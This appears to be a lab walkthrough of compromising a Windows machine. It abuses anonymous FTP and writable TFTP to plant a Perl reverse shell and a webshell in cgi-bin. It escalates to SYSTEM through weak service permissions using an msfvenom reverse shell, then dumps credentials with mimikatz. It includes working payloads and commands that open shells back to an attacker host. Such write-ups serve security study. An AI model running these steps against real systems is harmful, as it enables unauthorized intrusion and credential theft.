# Port 21(FTP+TFTP)

1. nmap detected WarFTP 1.65
   * There is a buffer overflow exploit for this version, but it does not work
1. Allows anonymous access
   ![500](images/scream%20ftp%20anon.png)
   * No read/write access
   * OpenTFTPServerMT could indicate that tftpd is running
1. At `/root` dir, 
   ![500](images/scream%20root%20dir.png)
   * These files indicates that FTP is sharing its web directory files (`/root`), if we are able to put a reverse shell perl script into cgi-bin, we have rce
1. Try tftp
   ![500](images/scream%20tftp%20write%20access.png)
   * TFTP is under `/root` directory
   * we are able to insert files
1. Upload perl webshell/reverseshell script via tftp
1. Generate perl reverse shell script
   1. Generate msfvenom payload
      ````
      msfvenom -p cmd/windows/reverse_perl LHOST=10.2.0.3 LPORT=4444 -o shell.pl
      ````
   
   1. Remove useless characters `perl -MIO -e, "", \`
      ![500](images/scream%20remove%20characters%20from%20payload.png)
   1. Prepend `use IO::Socket::INET` module & change IP address
      ![500](images/scream%20prepend%20socket%20module.png)
   1. Final payload
      ````
      use IO::Socket::INET;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
      ````

1. Upload perl shell via TFTP at `cgi-bin/`
   ![500](images/scream%20uploaded%20perl%20script.png)
1. Obtain a low-priv shell by visiting `http://192.168.1.98/cgi-bin/shell3.pl`
   ![500](images/scream%20low-priv%20shell%20obtained.png)
1. Additional Shell,  Upload webshell 
   ````
   cp /usr/share/webshell/perl/perlcmd.cgi $(pwd)/perlcmd.pl
   tftp put cgi-bin/perlcmd.pl
   ````
   
   ![500](images/scream%20perl%20webshell.png)
1. Execute commands
   ````
   192.168.1.98/cgi-bin/perlcmd.pl?dir
   ````
   
   ![500](images/scream%20webshell%20uploaded.png)
1. Upload ncat.exe
   ![500](images/scream%20uploaded%20ncat.exe.png)
1. Obtain a low-priv shell 
   ````
   192.168.1.98/cgi-bin/perlcmd.pl?ncat.exe%20192.168.1.1%204444%20-e%20cmd.exe
   ````
   
   ![500](images/scream%20low-priv%20shell%20obtained%202.png)

# Privilege Escalation to SYSTEM  - 1 via RW Service

1. View current processes running as SYSTEM
   ````
   tasklist /FI "username eq SYSTEM"
   ````
   
   ![400](images/scream%20current%20processes.png)
   * Take note of 3rd Party/Non-Default applications
     * FileZilla
     * FreeSSHD
     * TFTP
1. View running services
   ````
   net start
   # This is their display name, not service name
   ````
   
   ![500](images/scream%20running%20services.png)
1. Check if you can stop the service
   ````
   net stop "FileZilla Server FTP Server"
   ````
   
   ![500](images/scream%20able%20to%20stop%20service.png)
1. Get exact name of service,
   ````
   sc query | findstr /i "FileZilla"
   sc query | findstr /i "TFTP"
   sc query | findstr /i "SSHD"
   ````
   
   ![500](images/scream%20service%20name.png)
1. Check for user's permission on the service
   ````
   accesschk.exe /accepteula -uwcqv alex "FileZilla Server"
   accesschk.exe /accepteula -uwcqv alex "TFTPServer"
   accesschk.exe /accepteula -uwcqv alex "FREESSHDService"
   ````
   
   ![500](images/scream%20check%20access%20for%20user%20for%20service.png)
   * RW, SERVICE_ALL_ACCESS
1. Display information about the service
   ````
   sc qc "FileZilla Server"
   ````
   
   ![500](images/scream%20service%20info.png)
   * Since have SERVICE_ALL_ACCESS 
   * We can change path of `BINARY_PATH_NAME` to reverse shell.exe
1. Generate payload & Upload it to target
   ````
   msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f exe -o rev.exe
   ````

1. Replace `BINARY_PATH_NAME` to our reverse shell
   ````
   sc config "FileZilla Server" binpath= "\"C:\www\root\cgi-bin\rev.exe""
   ````

1. Check updated Service Configuration
   ````
   sc qc "FileZilla Server"
   ````
   
   ![400](images/scream%20updated%20service%20binary%20path.png)
1. Start listener & service to obatin SYSTEM shell
   ````
   net start "FileZilla Server FTP Server"
   ````
   
   ![500](images/scream%20SYSTEM%20shell%20obtained.png)

# Privilege Escalation to SYSTEM  - 1 via RW Service Binary

1. Instead of changing the BINARY_PATH, we check if write access to the binary 
1. Change back BINARY_PATH to default
   ````
   sc config "FileZilla Server" binpath= "\"C:\Program Files\FileZilla Server\FileZilla Server.exe""
   ````

1. View updated service configuration
   ````
   sc qc "FileZilla Server"
   ````
   
   ![500](images/scream%20updated%20service%20config%202.png)
1. Check if we have write access to the binary "FileZilla Server.exe"
   ````
   accesschk.exe /accepteula alex -quvw "C:\Program Files\FileZilla Server\FileZilla Server.exe"
   ````
   
   ![Pasted image 20220108145648.png](images/Pasted%20image%2020220108145648.png)
   * RW, FILE_ALL_ACCESS
1. Replace binary with our reverse shell
   ````
   move "C:\Program Files\FileZilla Server\FileZilla Server.exe" "C:\Program Files\FileZilla Server\FileZilla Server.exe.bak"
   
   copy "C:\www\root\cgi-bin\rev.exe" "C:\Program Files\FileZilla Server\FileZilla Server.exe"
   ````
   
   ![500](images/scream%20backup%20filezilla%20&%20replace%20filezilla%20with%20rev%20shell.png)
1. Start listener & Service to obtain SYSTEM shell
   ````
   net start "FileZilla Server FTP Server"
   ````
   
   ![500](images/scream%20SYSTEM%20shell%20obtained%202.png)

# Obtain Alex Password

1. Via mimikatz.exe
1. Upload mimikatz.exe
1. Obtain password
   ````
   mimikatz.exe
   sekurlsa::logonpasswords
   ````
   
   ![500](images/scream%20alex%20password.png)

---

Tags: #tcp/22-ftp/anon #tcp/22-ftp/write-access #win-priv-esc/rw-service-bin #win-priv-esc/rw-service

---
